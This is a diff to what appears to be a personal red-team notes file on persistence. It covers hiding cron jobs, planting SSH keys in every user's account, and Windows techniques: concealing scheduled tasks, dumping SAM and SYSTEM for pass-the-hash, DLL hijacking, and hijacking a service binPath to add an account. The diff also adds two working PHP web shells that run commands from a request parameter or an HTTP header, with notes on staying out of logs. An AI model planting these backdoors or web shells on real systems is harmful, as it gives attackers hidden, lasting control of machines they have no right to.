@@ -21,31 +21,55 @@ These are all the places you can hide cron jobs:
 - `/etc/cron.daily/`
 - `/etc/cron.weekly/`
 - `/etc/cron.monthly/`
-
 ###### SSH Keys:
 - If you don't have an SSH key, generate one with `ssh-keygen`. 
 - Add your public key to the `~/.ssh/authorized_keys` file in every user's directory. Create the file if it isn't already present, then add a new line in the file and put your public key there.
 - Set the permissions on the file and directory by running `chmod 700 ~/.ssh` and 
   `chmod 600 ~/.ssh/authorized_keys`
-- 
 
-- Windows
-	- Registry Run Keys
-	- Scheduled Tasks
-		- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
-	- Startup Folder
-	- Malicious user acct
-		- Administrator User
-			- If NOT:
-				- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
-	- DLL Hijacking
-	- Poisoning Shortcuts
-	- Backdoor Applications
-		- [[MSFVenom]] has functionality for this.
-	- Replace Default Applications for File types
-		- HKEY_CLASSES_ROOT???
-	- Malicious Services
-		- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
+
+#### Windows
+- Registry Run Keys
+- Scheduled Tasks
+	- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
+- Startup Folder
+- Malicious user acct
+	- Administrator User
+		- If NOT:
+			- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
+- DLL Hijacking
+- Poisoning Shortcuts
+- Backdoor Applications
+	- [[MSFVenom]] has functionality for this.
+- Replace Default Applications for File types
+	- HKEY_CLASSES_ROOT???
+- Malicious Services
+	- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
+
+
+#### PHP
+###### PHP Command Parameter
+If you find a web server that uses PHP, put this code snippet somewhere in the PHP page. Then, you'll be able to send commands to the website via GET and POST requests.
+```php
+<?php  
+if (isset($_REQUEST['cmd'])) {  
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
+}  
+?>
+```
+Command execution example: `http://example.com/webscript.php?cmd=ls` (this uses a GET request, which is less stealthy than using a POST request.)
+
+Alternatively, you could use the following code to achieve the same effect, but using HTTP headers instead. (This option is stealthier than GET or POST requests.)
+``` PHP
+<?php  
+if (isset($_SERVER['HTTP_CMD'])) {  
+echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";  
+}  
+?>
+```
+Command execution example: `curl -H "CMD: ls" http://example.com/webscript.php`
+- This method sends the commands via a custom HTTP header. HTTP headers often aren't displayed in logs, so it's quite stealthy. 
+###### Steal PHP Sessions
 
 ## Domain Persistence
 ### Credentials
